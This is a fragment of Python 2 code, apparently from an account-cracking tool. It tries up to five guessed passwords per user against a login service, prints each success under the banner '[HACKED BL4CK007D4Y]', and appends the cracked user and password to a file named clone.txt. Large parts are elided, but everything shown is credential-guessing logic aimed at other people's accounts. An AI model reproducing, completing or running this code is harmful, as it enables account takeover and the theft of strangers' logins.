    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass2
                    okb = open('anggaxd/clone.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass3
                        okb = open('anggaxd/clone.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass4
                            okb = open('anggaxd/clone.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass5
                                okb = open('anggaxd/clone.txt', 'a')
